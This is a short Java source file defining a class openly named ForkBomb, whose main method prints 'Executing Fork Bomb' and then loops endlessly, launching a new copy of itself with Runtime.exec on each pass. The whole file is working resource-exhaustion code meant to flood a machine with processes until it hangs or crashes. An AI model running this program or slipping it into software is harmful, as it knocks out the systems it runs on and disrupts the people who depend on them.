package org.example;


public class ForkBomb {
    public static void main(String[] args) {

        try {
            System.out.println("Executing Fork Bomb");
            while (true) {
                Runtime.getRuntime().exec("java ForkBomb");
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
